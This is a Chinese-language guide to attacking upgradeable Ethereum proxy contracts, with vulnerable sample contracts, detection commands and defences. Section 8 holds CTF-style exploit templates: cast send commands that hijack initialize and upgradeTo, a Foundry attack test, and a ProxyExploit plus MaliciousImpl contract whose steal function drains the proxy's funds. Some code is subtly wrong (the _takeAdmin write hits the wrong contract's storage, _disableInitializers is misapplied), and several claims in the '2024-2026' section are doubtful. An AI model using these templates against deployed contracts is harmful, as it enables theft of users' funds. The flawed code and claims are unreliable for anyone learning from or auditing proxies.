# 代理合约攻击 (Proxy Attacks)

## 原理

代理合约通过 `delegatecall` 将逻辑转发到实现合约，状态存储在代理合约中。这种分离模式带来了一系列攻击面：存储槽冲突、函数选择器冲突、实现合约逻辑缺陷、升级劫持等。EIP-1967 通过标准化存储槽避免冲突，但攻击向量并未完全消除。

---

## 1. EIP-1967 标准存储槽

EIP-1967 定义了三个关键存储槽，通过伪随机哈希避免与业务逻辑存储槽冲突：

| 用途 | 存储槽 | 值 |
|------|--------|------|
| Admin | `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103` | `bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1)` |
| Implementation | `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` | `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)` |
| Beacon | `0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50` | `bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)` |

### 读取 EIP-1967 存储槽

```bash
# 使用 cast 读取代理合约存储
# 读取 Implementation 地址
cast storage $PROXY_ADDRESS 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC_URL

# 读取 Admin 地址
cast storage $PROXY_ADDRESS 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103 --rpc-url $RPC_URL

# 读取 Beacon 地址
cast storage $PROXY_ADDRESS 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50 --rpc-url $RPC_URL
```

### 读取所有存储槽

```bash
# 使用 cast dump 导出所有存储
cast dump $PROXY_ADDRESS --rpc-url $RPC_URL --blocks latest > storage_dump.json
```

---

## 2. 透明代理模式 (Transparent Proxy Pattern)

透明代理通过 Admin 角色区分调用者：Admin 只能调用管理函数（升级、更改 admin），普通用户只能调用逻辑合约函数。通过修改 EVM 的 `msg.sender` 来实现路由。

### 透明代理合约 (简化版)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TransparentProxy {
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    modifier ifAdmin() {
        if (msg.sender == _getAdmin()) {
            _;
        } else {
            _fallback();
        }
    }

    function _fallback() internal {
        address impl = _getImplementation();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function changeAdmin(address newAdmin) public ifAdmin {
        _setAdmin(newAdmin);
    }

    function upgradeTo(address newImplementation) public ifAdmin {
        _setImplementation(newImplementation);
    }

    fallback() external payable {
        _fallback();
    }

    function _getAdmin() internal view returns (address) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sload(slot)
        }
    }

    function _getImplementation() internal view returns (address) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sload(slot)
        }
    }

    function _setAdmin(address newAdmin) internal {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, newAdmin)
        }
    }

    function _setImplementation(address newImpl) internal {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImpl)
        }
    }
}
```

### 透明代理的攻击面

```solidity
// 攻击点1: Admin 权限劫持 — 如果 admin 地址未设置或被设为 address(0)
// 攻击点2: 初始部署时 admin 未转移给安全的多签
// 攻击点3: upgradeTo 调用缺少初始化保护

// 漏洞示例：可被任何人设置 admin 的透明代理
contract VulnerableTransparentProxy {
    // admin 存储在 slot 0 (非 EIP-1967!)
    address public admin;
    address public implementation;

    constructor(address _impl) {
        admin = msg.sender;
        implementation = _impl;
    }

    // 漏洞：admin 可以被任何人覆盖（未检查 msg.sender == admin）
    function changeAdmin(address newAdmin) external {
        admin = newAdmin;  // 任何人都可以修改 admin!
    }

    // 漏洞：实现合约可以被任何人升级
    function upgradeTo(address newImpl) external {
        implementation = newImpl;  // 缺少权限检查!
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

---

## 3. UUPS 代理模式 (EIP-1822)

UUPS (Universal Upgradeable Proxy Standard) 将升级逻辑放在实现合约中，而非代理合约本身。代理合约更轻量，但升级安全性依赖实现合约。

### UUPS 合约结构

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// EIP-1822: Universal Upgradeable Proxy Standard
contract ERC1822_Proxy {
    constructor(address _impl) {
        assembly {
            sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, _impl)
        }
    }

    fallback() external payable {
        address impl;
        assembly {
            impl := sload(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
        }
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// UUPS 实现合约
abstract contract UUPSUpgradeable {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function upgradeTo(address newImplementation) public virtual {
        _authorizeUpgrade(newImplementation);
        _setImplementation(newImplementation);
    }

    function upgradeToAndCall(address newImplementation, bytes calldata data) public virtual {
        _authorizeUpgrade(newImplementation);
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Upgrade call failed");
        }
    }

    function _authorizeUpgrade(address newImplementation) internal virtual;

    function _setImplementation(address newImplementation) internal {
        require(newImplementation.code.length > 0, "Invalid implementation");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
```

### UUPS 的致命缺陷

```solidity
// 攻击点1: 如果实现合约被自毁 (SELFDESTRUCT)，
//         代理将无法再升级 — 永久锁死

// 攻击点2: 升级函数缺少 _authorizeUpgrade 保护
contract VulnerableUUPS is UUPSUpgradeable {
    address public owner;

    function initialize(address _owner) external {
        owner = _owner;
    }

    // 缺少 _authorizeUpgrade 覆写 — 任何人都能升级！
    function _authorizeUpgrade(address) internal override {
        // 未检查 msg.sender == owner
    }
}

// 攻击点3: 实现合约未初始化
// 任何人可以直接调用实现合约的初始化函数
// 然后调用 upgradeTo 指向恶意合约

// 攻击 payload:
// 1. 调用实现合约的 initialize() 获取 owner 权限
// 2. 调用 upgradeTo(maliciousContract) 替换实现
```

---

## 4. 存储槽冲突攻击 (Storage Collision)

当代理合约和实现合约使用相同的存储槽时，会导致数据覆盖。

### 简单存储冲突

```solidity
// 代理合约
contract BadProxy {
    address public admin;        // slot 0
    address public implementation; // slot 1

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// 实现合约
contract Logic {
    uint256 public value;  // slot 0 — 冲突!
    address public owner;  // slot 1 — 冲突!

    function setValue(uint256 v) external {
        value = v;  // 实际覆盖了 proxy 的 admin!
    }

    function setOwner(address o) external {
        owner = o;  // 实际覆盖了 proxy 的 implementation!
    }
}
```

### EIP-1967 如何避免冲突

```
EIP-1967 存储槽计算方式:
keccak256("eip1967.proxy.admin") - 1
= keccak256(0x656970313936372e70726f78792e61646d696e) - 1
= 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6104 - 1
= 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103

这些超大 slot 编号与正常合约使用的 slot 0, 1, 2... 几乎不可能冲突
```

### 未初始化代理的存储冲突利用

```solidity
// 攻击场景：代理已部署但逻辑合约的初始化函数未调用
// 攻击者直接调用逻辑合约（非代理）的 initialize

// 逻辑合约
contract LogicV1 {
    address public owner;
    uint256 public totalSupply;

    function initialize(address _owner) external {
        require(owner == address(0), "Already initialized");
        owner = _owner;
    }
}

// 攻击者绕过代理，直接调用逻辑合约
// 由于 delegatecall，逻辑合约的状态写入代理的存储
// 攻击者成为代理的 owner
```

---

## 5. 函数选择器冲突 (Function Selector Clash)

当代理合约的管理函数和实现合约的业务函数具有相同的 4 字节选择器时，会引发路由问题。

### 选择器冲突原理

```solidity
// 代理合约有 upgradeTo(address)  — 选择器: 0x3659cfe6
// 实现合约恰好有 func3659cfe6() — 选择器: 0x3659cfe6 (碰撞!)

// 透明代理的解决方案：
// Admin 调用 → 路由到代理管理函数
// 非 Admin 调用 → 路由到实现合约

// 如果使用非透明代理，冲突可能导致：
// 1. 用户意外触发升级函数
// 2. 升级函数被路由到逻辑合约
```

### 选择器计算

```bash
# 使用 cast 计算函数选择器
cast sig "upgradeTo(address)"   # 0x3659cfe6
cast sig "upgradeToAndCall(address,bytes)"  # 0x4f1ef286

# 在代理合约的 fallback 中检查 calldata 前 4 字节
cast calldata "upgradeTo(address)" 0xDeadBeef
```

### 选择器冲突检测脚本

```python
#!/usr/bin/env python3
"""检测代理合约和实现合约的函数选择器冲突"""
from web3 import Web3

def get_selectors(abi):
    """从 ABI 提取所有函数选择器"""
    selectors = {}
    for item in abi:
        if item.get('type') == 'function':
            sig = item['name'] + '(' + ','.join(
                i['type'] for i in item.get('inputs', [])
            ) + ')'
            selector = Web3.keccak(text=sig)[:4].hex()
            selectors[selector] = item['name']
    return selectors

def check_collision(proxy_selectors, impl_selectors):
    """检测冲突"""
    collisions = {}
    for sel, name in proxy_selectors.items():
        if sel in impl_selectors:
            collisions[sel] = {
                'proxy_func': name,
                'impl_func': impl_selectors[sel]
            }
    return collisions

# 示例使用
# proxy_abi = [...]   # 代理合约 ABI
# impl_abi = [...]    # 实现合约 ABI
# proxy_sels = get_selectors(proxy_abi)
# impl_sels = get_selectors(impl_abi)
# conflicts = check_collision(proxy_sels, impl_sels)
# for sel, info in conflicts.items():
#     print(f"冲突! 选择器 {sel}: proxy={info['proxy_func']} impl={info['impl_func']}")
```

---

## 6. 实现合约逻辑漏洞 (Implementation Logic Bugs)

### 6.1 未初始化实现合约

```solidity
// 实现合约 — 初始化函数可被任何人调用
contract LogicV2 {
    address public owner;
    uint256 public locked;

    // 缺 modifier 或 initializer 保护
    function initialize(address _owner) external {
        // 没有 require(owner == address(0))
        owner = _owner;
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(msg.sender).transfer(address(this).balance);
    }
}

// 攻击：直接调用实现合约的 initialize
// 攻击者成为 owner，控制代理的资金
```

### 6.2 使用 OpenZeppelin Initializable

```solidity
// 正确的初始化保护
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract LogicV3 is Initializable {
    address public owner;

    function initialize(address _owner) public initializer {
        owner = _owner;
    }
}

// 注意：initializer modifier 只能防止多次初始化
// 但无法防止直接在实现合约上初始化（非代理）
// 解决方案：在构造函数中调用 _disableInitializers()
```

### 6.3 delegatecall 注入

```solidity
// 漏洞：允许用户指定 delegatecall 的目标
contract VulnerableLogic {
    function execute(address target, bytes calldata data) external {
        // 危险：用户可以指向任意合约
        (bool success,) = target.delegatecall(data);
        require(success);
    }
}

// 攻击者通过代理调用 execute
// 由于是 delegatecall 链:
// 用户 → proxy.delegatecall → logic.execute(target, data) → target.delegatecall(data)
// 第二层 delegatecall 使用 proxy 的存储上下文
// 攻击者可以修改代理的任意存储槽
```

---

## 7. 升级劫持 (Upgrade Hijacking)

### 7.1 攻击者获取 Admin 权限

```solidity
// 场景1: Admin 私钥泄露
// 攻击者获取 admin 私钥 → 调用 upgradeTo(malicious) → 控制所有用户资金

// 场景2: 初始 Admin 为 EOA，未转移给多签
// 攻击者社工/破解 admin 的私钥

// 场景3: Admin 初始化为 address(0)
// 合约中的权限检查被绕过
```

### 7.2 恶意实现合约

```solidity
// 升级到恶意合约
contract MaliciousLogic {
    address public owner;
    mapping(address => uint256) public balances;

    // 保留原接口，用户无感知
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    // 隐藏的后门：构造函数中转移所有资金
    constructor(address payable target) {
        // 由于 delegatecall，this == proxy
        // 这里实际上转移的是代理合约中的所有 ETH
        // 但使用了 staticcall 的上下文... 
        // 实际攻击中使用更复杂的手法
    }

    // 更隐蔽的后门：特定地址免验证
    function specialWithdraw(address to, uint256 amount) external {
        if (to == owner) {
            payable(to).transfer(amount);  // 绕过余额检查
        }
    }
}

// 升级 payload:
// 1. upgradeTo(maliciousLogic)
// 2. 调用恶意函数窃取资金
```

### 7.3 暂时性升级攻击 (Turbulent Upgrade)

```solidity
// 攻击者短暂升级到恶意合约
// 在一个区块内完成恶意操作
// 立即升级回正常合约
// 由于区块链状态回滚困难，用户难以追溯

// 攻击流程:
// Block N:   升级到恶意合约
// Block N+1: 恶意合约执行窃取操作
// Block N+2: 升级回原合约
// 用户看到 Block N+2 的状态，以为一切正常
```

---

## 8. CTF 常见题型与攻击 Payload

### 8.1 透明代理 admin 劫持

```solidity
// CTF 题目: 代理合约的 admin 存储在 slot 0 (非 EIP-1967)
// 攻击: 写入 slot 0 覆盖 admin

// 使用 Foundry 编写攻击测试
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IProxy {
    function admin() external view returns (address);
    function implementation() external view returns (address);
    function upgradeTo(address newImpl) external;
    function changeAdmin(address newAdmin) external;
}

contract ProxyAttackTest is Test {
    IProxy proxy;

    function setUp() public {
        // 部署代理合约
        proxy = IProxy(/* proxy address */);
    }

    function test_attack_admin_slot() public {
        // 方法1: 直接写入 admin 存储槽
        bytes32 adminSlot = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        address attacker = address(this);

        vm.store(
            address(proxy),
            adminSlot,
            bytes32(uint256(uint160(attacker)))
        );

        // 验证成为 admin
        assertEq(proxy.admin(), attacker);

        // 升级到恶意实现
        proxy.upgradeTo(maliciousImpl);
    }
}
```

### 8.2 UUPS 未授权升级

```solidity
// CTF 题目: UUPS 代理缺少 _authorizeUpgrade 实现
// 攻击: 直接调用 upgradeTo

// 使用 cast 发送交易
cast send $PROXY_ADDRESS "upgradeTo(address)" $MALICIOUS_IMPL --rpc-url $RPC_URL --private-key $PRIVATE_KEY

// 如果有初始化检查:
cast send $PROXY_ADDRESS "initialize(address)" $ATTACKER_ADDRESS --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $PROXY_ADDRESS "upgradeTo(address)" $MALICIOUS_IMPL --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 8.3 存储碰撞利用

```solidity
// CTF 题目: 代理和实现合约在 slot 0 都有变量
// 攻击: 通过实现合约的函数间接修改代理状态

// 代理 slot 0 = admin
// 实现 slot 0 = owner (初始化后)
// 两者共用 slot 0

// 攻击脚本 (Foundry)
contract StorageCollisionExploit is Test {
    function test_exploit() public {
        // 通过实现合约的 setOwner 修改 slot 0
        // 这会覆盖代理的 admin
        ILogic logic = ILogic(IMyProxy(proxy).implementation());

        // 先初始化
        logic.initialize(attacker);

        // 验证 slot 0 现在是 attacker 地址
        bytes32 val = vm.load(address(proxy), bytes32(0));
        assertEq(address(uint160(uint256(val))), attacker);

        // 现在 attacker 是 admin，可以升级
    }
}
```

### 8.4 通过代理调用实现合约初始化

```solidity
// CTF 题目: 代理合约已部署，但 initialize() 未被调用
// 直接通过代理调用 initialize

cast send $PROXY_ADDRESS "initialize(address)" $ATTACKER_ADDRESS --rpc-url $RPC_URL --private-key $PRIVATE_KEY

// 验证
cast call $PROXY_ADDRESS "owner()" --rpc-url $RPC_URL
```

### 8.5 完整 CTF 攻击模板

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IProxy {
    function admin() external view returns (address);
    function implementation() external view returns (address);
    function upgradeTo(address) external;
    function changeAdmin(address) external;
    fallback() external payable;
}

contract ProxyExploit {
    IProxy public proxy;

    constructor(address _proxy) {
        proxy = IProxy(_proxy);
    }

    function attack(address _maliciousImpl) external {
        // Step 1: 获取 admin 权限
        // 方法 A: 如果 admin slot 可写
        _takeAdmin();

        // 方法 B: 如果 initialize 可调用
        // bytes memory initData = abi.encodeWithSignature("initialize(address)", address(this));
        // (bool success,) = address(proxy).call(initData);

        // Step 2: 升级到恶意实现
        proxy.upgradeTo(_maliciousImpl);

        // Step 3: 调用恶意合约函数窃取资金
        // 通过代理调用恶意合约的 backdoor 函数
        bytes memory stealData = abi.encodeWithSignature("steal(address)", msg.sender);
        (bool success,) = address(proxy).call(stealData);
        require(success, "Steal failed");
    }

    function _takeAdmin() internal {
        // 写入 EIP-1967 admin slot
        bytes32 adminSlot = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        assembly {
            sstore(adminSlot, caller())
        }
    }

    receive() external payable {}
}

// 恶意实现合约
contract MaliciousImpl {
    address public owner;

    function initialize(address _owner) external {
        owner = _owner;
    }

    function steal(address to) external {
        payable(to).transfer(address(this).balance);
    }

    // 保留原始接口以避免被发现
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

---

## 9. 攻击诊断与检测

### 9.1 代理合约识别

```bash
# 检查合约是否是代理 — 查看 EIP-1967 implementation slot
cast code $PROXY_ADDRESS --rpc-url $RPC_URL

# 如果代码很短（~100 字节），很可能是代理
# 典型代理字节码特征：
# 1. 包含 DELEGATECALL opcode (0xf4)
# 2. 包含 STORAGELOAD/STORAGESSTORE
# 3. 有 fallback 处理

# 使用代理检测工具
npx hardhat-etherscan verify --network mainnet

# 检查实现合约
cast call $PROXY_ADDRESS "implementation()" --rpc-url $RPC_URL

# EIP-1967 方式读取
cast storage $PROXY_ADDRESS 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC_URL
```

### 9.2 存储差异分析

```bash
# 比较升级前后的存储差异
cast dump $PROXY_ADDRESS --blocks N > before_upgrade.json
# ... 执行升级 ...
cast dump $PROXY_ADDRESS --blocks M > after_upgrade.json

# 使用 python 分析差异
python3 -c "
import json
with open('before_upgrade.json') as f: before = json.load(f)
with open('after_upgrade.json') as f: after = json.load(f)
for slot in set(list(before.keys()) + list(after.keys())):
    b = before.get(slot, '0x0')
    a = after.get(slot, '0x0')
    if b != a:
        print(f'Slot {slot}: {b} -> {a}')
"
```

### 9.3 OpenZeppelin Proxy 检查工具

```bash
# 使用 @openzeppelin/upgrades-core
npx @openzeppelin/upgrades-core unsafe-allow

# 检测存储布局兼容性
npx hardhat compile
npx hardhat test --grep "upgrade"

# Slither 代理检测
slither $PROXY_ADDRESS --detect delegatecall-forward
slither $PROXY_ADDRESS --detect delegatecall-to-user-supplied-address
```

---

## 10. 防护方法

### 1. 使用 EIP-1967 标准存储槽

```solidity
// OpenZeppelin ERC1967Proxy
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Upgrade.sol";

// 初始化时调用 _disableInitializers()
constructor(address _logic) ERC1967Proxy(_logic, "") {
    _disableInitializers();
}
```

### 2. UUPS 使用 _disableInitializers

```solidity
abstract contract UUPSUpgradeable {
    function __UUPSUpgradeable_init() internal onlyInitializing {
        _disableInitializers();
    }
}

// 或在构造函数中
constructor() {
    _disableInitializers();
}
```

### 3. 升级权限控制

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";

contract LogicV1 is UUPSUpgradeable, Ownable {
    function initialize(address _owner) public initializer {
        __Ownable_init(_owner);
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}
}
```

### 4. Timelock 升级

```solidity
import "@openzeppelin/contracts/governance/TimelockController.sol";

// 升级需要通过 Timelock
// 提交升级提案 → 等待 timelock 延迟 → 执行升级
// 给用户时间退出
```

---

## 2024-2026 新技术点

### 1. EIP-7702 账户抽象代理 (2024-2025)

```solidity
// EIP-7702 允许 EOA 临时委托到智能合约
// 存储在 nonce 位置，而非传统代理的 slot
// 攻击向量: 委托到恶意合约后无法撤销

// 新的代理模式:
// EOA → EIP-7702 委托 → 智能合约逻辑
// 存储在 EOA 的账户上下文中，而非合约存储
```

### 2. ERC-4626 代理金库升级攻击 (2024)

```solidity
// ERC-4626 代币化金库使用代理模式
// 攻击: 升级金库实现合约
// 修改 deposit/withdraw 逻辑
// 窃取用户存入的资金

// 实际案例: 金库升级到修改 share 计算逻辑的实现
```

### 3. Diamond 代理 (EIP-2535) 攻击面 (2024-2025)

```solidity
// Diamond 使用多个实现合约 (facet)
// 每个 facet 的函数选择器映射到不同地址
// 攻击向量:
// 1. facet 替换攻击 — 替换某个 facet 的地址
// 2. selector 重映射 — 修改 selector → facet 映射
// 3. diamondCut 权限控制缺陷

interface IDiamondLoupe {
    struct Facet {
        address facetAddress;
        bytes4[] functionSelectors;
    }

    function facets() external view returns (Facet[] memory);
    function facetAddresses() external view returns (address[] memory);
    function facetFunctionSelectors(address facet) external view returns (bytes4[] memory);
    function facetAddress(bytes4 functionSelector) external view returns (address);
}
```

### 4. Beacon 代理链式攻击 (2024-2025)

```solidity
// Beacon 代理: 多个代理指向同一个 Beacon 合约
// Beacon 存储实现地址
// 攻击: 升级 Beacon → 一次性控制所有代理

// EIP-1967 Beacon slot:
// 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50

// 新攻击: 利用 Beacon 的 event 进行前端攻击
// Beacon 升级会触发 Upgraded event
// 攻击者监控该事件并抢先执行恶意操作
```

### 5. 跨链代理状态同步漏洞 (2024-2025)

```solidity
// L1 → L2 的代理合约状态同步
// 攻击: 在 L1 升级代理
// L2 的状态更新延迟期间进行攻击

// 特别是使用 CREATE2 部署的代理
// 地址相同但存储在不同链上
// 状态不一致可能导致漏洞
```

### 6. 创始区块代理后门 (2024)

```solidity
// 2024年出现的新攻击向量
// 在创世区块或早期区块部署的代理合约
// 使用特殊的初始化序列隐藏后门

// 检测: 查看创世区块后的前几笔交易
// 检查代理部署和初始化是否在同一交易
```

### 7. 可升级合约的量子安全迁移 (2025-2026)

```solidity
// 后量子密码学威胁
// 现有代理合约的 admin 使用 ECDSA 签名
// 量子计算机可破解 ECDSA → admin 权限被夺取

// 新方向: 
// 1. 迁移到后量子签名方案
// 2. 代理合约的密钥轮换机制
// 3. 阈值签名控制升级
```

### 8. AI 辅助代理合约漏洞检测 (2024-2026)

```python
# 使用 LLM 辅助分析代理合约
# 1. 自动检测存储布局冲突
# 2. 识别缺失的初始化保护
# 3. 检查升级权限控制
# 4. 发现隐藏的后门函数

# 工具: 
# - OpenZeppelin Defender
# - Slither + AI 增强
# - Certora Prover
```

### 9. ERC-6551 代币绑定账户代理攻击 (2024-2025)

```solidity
// ERC-6551: 每个 NFT 可以有一个绑定的智能合约账户
// 新的代理模式: NFT → 绑定账户 → 逻辑合约

// 攻击向量:
// 1. 绑定账户升级 — 修改 NFT 的绑定逻辑
// 2. 跨 NFT 代币转移
// 3. 治理投票权操纵
```

### 10. 模块化代理与 blobs (2025-2026)

```solidity
// EIP-4844 (Proto-Danksharding) 引入 blob
// 新的代理模式: 使用 blob 存储实现合约代码
// 降低部署成本但增加攻击面

// blob 数据在 ~18 天后被删除
// 如果实现代码依赖 blob → 合约可能失效
// 攻击: 等待 blob 过期 → 代理指向不存在的代码
```

---

## 工具推荐

- **Foundry** — 合约开发/测试，`cast storage` 读取代理存储
- **OpenZeppelin Upgrades Plugins** — 代理部署和升级检测
- **Slither** — 静态分析，检测代理相关漏洞
- **Mythril** — 符号执行，检测 delegatecall 风险
- **Certora Prover** — 形式化验证代理合约属性
- **Echidna** — 模糊测试，测试升级逻辑
- **OpenZeppelin Defender** — 代理管理和监控

## 参考链接

- [EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)
- [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)
- [EIP-2535: Diamond Standard](https://eips.ethereum.org/EIPS/eip-2535)
- [EIP-7702: Set EOA account code for next transaction](https://eips.ethereum.org/EIPS/eip-7702)
- [OpenZeppelin Proxy Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy)
- [OpenZeppelin Upgrades Plugins](https://github.com/OpenZeppelin/openzeppelin-upgrades)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [Proxy Patterns - Comprehensive Guide](https://blog.openzeppelin.com/proxy-patterns)
- [Transparent vs UUPS Proxy](https://blog.openzeppelin.com/transparent-vs-uups-proxies-40657e6ac63a)
- [Ethernaut Level 19: Upgrade](https://ethernaut.openzeppelin.com/level/19)
